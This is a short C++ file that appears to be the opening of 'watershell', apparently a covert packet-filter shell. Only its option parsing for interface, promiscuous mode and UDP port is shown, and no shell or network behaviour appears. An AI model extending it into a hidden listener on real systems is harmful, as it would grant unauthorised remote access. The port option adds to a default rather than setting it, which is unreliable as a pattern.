#define DEBUG true

#include <iostream>
#include "watershell.h"

int main(int argc, char *argv[]) {
    int i, n, hlen, arg;
    struct sock_fprog filter;
    char buf[2048];
    unsigned char *read;
    char *udpdata, *iface = IFACE;
    struct iphdr *ip;
    struct udphdr *udp;
    unsigned port = PORT;
    int code = 0;

    while ((arg = getopt(argc, argv, "phi:l:")) != -1){
        switch (arg){
            case 'i':
                iface = optarg;
                break;
            case 'p':
                if (DEBUG)
                    puts("Running in promisc mode");
                promisc = true;
                break;
            case 'h':
                if (DEBUG)
                    fprintf(stderr, "Usage: %s [-l port] [-p] -i iface\n", argv[0]);
                return 0;
                break;
            case 'l':
                port += strtoul(optarg, NULL, 10);
                if (port <= 0 || port > 65535){
                    if (DEBUG)
                        puts("Invalid port");
                    return 1;
                }
                break;
            case '?':
                if (DEBUG)
                    fprintf(stderr, "Usage: %s [-l port] [-p] -i iface\n", argv[0]);
                return 1;
            default:
                abort();
        }
    }
}